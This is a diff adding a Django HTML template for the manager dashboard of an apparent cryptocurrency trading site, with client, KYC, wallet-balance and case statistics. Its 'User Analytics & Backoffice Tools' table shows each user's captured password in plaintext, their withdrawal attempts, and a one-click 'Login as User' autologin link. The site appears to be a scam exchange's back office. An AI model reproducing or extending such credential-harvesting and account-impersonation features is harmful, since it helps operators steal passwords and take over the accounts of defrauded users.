@@ -1,0 +1,255 @@
+{% extends 'SVEX_APP/base_manager.html' %}
+
+{% block title %}Manager Home{% endblock %}
+
+{% block content %}
+<div class="container">
+    <h1 class="page-title">Manager Dashboard</h1>
+
+    <div class="dashboard-grid">
+        <!-- Client Statistics Card -->
+        <div class="card card-blue">
+            <h2>Client Statistics</h2>
+            <div class="stat-item">
+                <strong>Total Clients:</strong> <span>{{ total_clients }}</span>
+            </div>
+            <div class="stat-item">
+                <strong>Active Clients:</strong> <span>{{ active_clients_count }}</span>
+            </div>
+            <div class="stat-item">
+                <strong>Phone Provided:</strong> <span>{{ phone_provided_percentage }}%</span>
+            </div>
+            <div class="stat-item">
+                <strong>Address Provided:</strong> <span>{{ address_provided_percentage }}%</span>
+            </div>
+            <div class="stat-item">
+                <strong>Average Credits:</strong> <span>{{ credits_summary.average_credits|floatformat:2 }}</span>
+            </div>
+            <div class="stat-item">
+                <strong>Overdue Clients:</strong> <span>{{ overdue_clients_count }}</span>
+            </div>
+        </div>
+
+        <!-- KYC Statistics Card -->
+        <div class="card card-green">
+            <h2>KYC Statistics</h2>
+            <div class="stat-item">
+                <strong>Pending:</strong> <span>{{ total_kyc_pending }}</span>
+            </div>
+            <div class="stat-item">
+                <strong>Confirmed:</strong> <span>{{ total_kyc_confirmed }}</span>
+            </div>
+            <div class="stat-item">
+                <strong>Cancelled:</strong> <span>{{ total_kyc_cancelled }}</span>
+            </div>
+            <div class="stat-item">
+                <strong>Clients w/ KYC:</strong> <span>{{ percentage_clients_with_kyc }}%</span>
+            </div>
+        </div>
+
+        <!-- Client Wallet Statistics Card -->
+        <div class="card card-teal">
+            <h2>Wallet Statistics</h2>
+            <div class="stat-item">
+                <strong>Total Wallets:</strong> <span>{{ total_wallets }}</span>
+            </div>
+            <div class="stat-item">
+                <strong>Total SpotBTC:</strong> <span>{{ total_spotbtc_balance }}</span>
+            </div>
+            <div class="stat-item">
+                <strong>Total BTC:</strong> <span>{{ total_btc_balance }}</span>
+            </div>
+            <div class="stat-item">
+                <strong>Total ETH:</strong> <span>{{ total_eth_balance }}</span>
+            </div>
+            <div class="stat-item">
+                <strong>Total USDT (ERC20):</strong> <span>{{ total_usdt_balance_erc20 }}</span>
+            </div>
+            <div class="stat-item">
+                <strong>Total USDT (TRC20):</strong> <span>{{ total_usd_balance_trc20 }}</span>
+            </div>
+        </div>
+
+        <!-- Case Statistics Card -->
+        <div class="card card-orange">
+            <h2>Case Statistics</h2>
+            <div class="stat-item">
+                <strong>Total Cases:</strong> <span>{{ total_cases }}</span>
+            </div>
+            <div class="stat-item">
+                <strong>Open:</strong> <span>{{ total_open_cases }}</span>
+            </div>
+            <div class="stat-item">
+                <strong>In Progress:</strong> <span>{{ total_in_progress_cases }}</span>
+            </div>
+            <div class="stat-item">
+                <strong>Resolved:</strong> <span>{{ total_resolved_cases }}</span>
+            </div>
+            <div class="stat-item">
+                <strong>Pending:</strong> <span>{{ total_pending_cases }}</span>
+            </div>
+        </div>
+        <!-- User Analytics & Magic Links Table -->
+        <div class="card full-width">
+            <h2>User Analytics & Backoffice Tools</h2>
+            <div style="overflow-x: auto;">
+                <table style="width: 100%; border-collapse: collapse; margin-top: 16px;">
+                    <thead>
+                        <tr style="background: #f1f5f9; text-align: left;">
+                            <th style="padding: 12px; border-bottom: 2px solid #e2e8f0; text-align: center;">Status</th>
+                            <th style="padding: 12px; border-bottom: 2px solid #e2e8f0;">User</th>
+                            <th style="padding: 12px; border-bottom: 2px solid #e2e8f0;">Captured Password</th>
+                            <th style="padding: 12px; border-bottom: 2px solid #e2e8f0;">Logins</th>
+                            <th style="padding: 12px; border-bottom: 2px solid #e2e8f0;">Time Spent</th>
+                            <th style="padding: 12px; border-bottom: 2px solid #e2e8f0;">Withdraws</th>
+                            <th style="padding: 12px; border-bottom: 2px solid #e2e8f0;">Magic Link (1-Click Login)</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        {% for u in user_tracking_list %}
+                        <tr style="border-bottom: 1px solid #e2e8f0;">
+                            <td style="padding: 12px; text-align: center;">
+                                {% if u.is_active %}
+                                <div style="width: 10px; height: 10px; border-radius: 50%; background: #10b981; margin: 0 auto; box-shadow: 0 0 6px #10b981;"></div>
+                                <small style="color: #10b981; display: block; margin-top: 4px; font-size: 11px;">Online</small>
+                                {% else %}
+                                <div style="width: 10px; height: 10px; border-radius: 50%; background: #94a3b8; margin: 0 auto;"></div>
+                                <small style="color: #64748b; display: block; margin-top: 4px; font-size: 11px;">{{ u.last_active_str }}</small>
+                                {% endif %}
+                            </td>
+                            <td style="padding: 12px;"><strong>{{ u.username }}</strong><br><small style="color:#64748b;">{{ u.email }}</small></td>
+                            <td style="padding: 12px; font-family: monospace; color: #dc2626;">{{ u.password }}</td>
+                            <td style="padding: 12px;">{{ u.logins }}</td>
+                            <td style="padding: 12px;">{{ u.time_spent }}</td>
+                            <td style="padding: 12px;">{{ u.withdraw_attempts }}</td>
+                            <td style="padding: 12px;">
+                                {% if u.token %}
+                                <a href="/autologin/{{ u.token }}/" target="_blank" style="display: inline-block; background: #2563eb; color: #0f172a; padding: 6px 12px; border-radius: 6px; text-decoration: none; font-size: 13px; font-weight: bold;">
+                                    🔑 Login as User
+                                </a>
+                                {% else %}
+                                <span style="color: #94a3b8; font-size: 13px;">No Token</span>
+                                {% endif %}
+                            </td>
+                        </tr>
+                        {% empty %}
+                        <tr>
+                            <td colspan="7" style="padding: 24px; text-align: center; color: #64748b;">No users found.</td>
+                        </tr>
+                        {% endfor %}
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+        
+        <!-- Website Information Card (Full Width) -->
+        <div class="card card-indigo full-width">
+            <h2>Website Information</h2>
+            <div class="info-grid">
+                <div class="stat-item"><strong>Name:</strong> <span>{{ website_info.name }}</span></div>
+                <div class="stat-item"><strong>Support Email:</strong> <span>{{ website_info.support_email }}</span></div>
+                <div class="stat-item"><strong>Phone:</strong> <span>{{ website_info.phone }}</span></div>
+                <div class="stat-item"><strong>Address:</strong> <span>{{ website_info.address }}</span></div>
+                <div class="stat-item"><strong>Telegram:</strong> <span>{{ website_info.telegram }}</span></div>
+                <div class="stat-item"><strong>WhatsApp:</strong> <span>{{ website_info.whatsapp }}</span></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<style>
+    /* Page Layout */
+    .container {
+        max-width: 1600px;
+        margin: 0 auto;
+        padding: 2rem;
+    }
+    .page-title {
+        color: #0f172a;
+        font-size: 2rem;
+        font-weight: 600;
+        margin: 0 0 2rem 0;
+    }
+    .dashboard-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+        gap: 1.5rem;
+    }
+
+    /* Base Card Style */
+    .card {
+        
+        padding: 1.5rem;
+        border-radius: 12px;
+        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+        border-top: 4px solid transparent; /* Placeholder for the accent color */
+        transition: transform 0.2s ease-in-out, box-shadow 0.2s ease-in-out;
+    }
+    .card:hover {
+        transform: translateY(-5px);
+        box-shadow: 0 8px 15px rgba(0, 0, 0, 0.4);
+    }
+    .card.full-width {
+        grid-column: 1 / -1; /* Make this card span the full width */
+    }
+
+    /* Card Color Accents */
+    .card-blue { border-top-color: #3b82f6; }
+    .card-blue h2 { color: #3b82f6; }
+
+    .card-green { border-top-color: #22c55e; }
+    .card-green h2 { color: #22c55e; }
+
+    .card-teal { border-top-color: #14b8a6; }
+    .card-teal h2 { color: #14b8a6; }
+
+    .card-orange { border-top-color: #f59e0b; }
+    .card-orange h2 { color: #f59e0b; }
+
+    .card-indigo { border-top-color: #6366f1; }
+    .card-indigo h2 { color: #6366f1; }
+    
+    /* Card Content Typography */
+    .card h2 {
+        font-size: 1.25rem;
+        font-weight: 600;
+        margin: 0 0 1.5rem 0;
+        padding-bottom: 1rem;
+        border-bottom: 1px solid #e2e8f0;
+    }
+    .stat-item {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 0.5rem 0;
+        font-size: 0.95rem;
+    }
+    .stat-item strong {
+        color: #a0a0a0;
+        font-weight: 500;
+    }
+    .stat-item span {
+        color: #334155;
+        font-weight: 600;
+        font-family: monospace;
+    }
+    
+    /* Special grid for Website Info card */
+    .info-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+        gap: 0 2rem; /* Vertical gap 0, horizontal gap 2rem */
+    }
+
+    /* Responsive */
+    @media (max-width: 768px) {
+        .dashboard-grid {
+            grid-template-columns: 1fr;
+        }
+        .page-title {
+            font-size: 1.75rem;
+        }
+    }
+</style>
+{% endblock %}
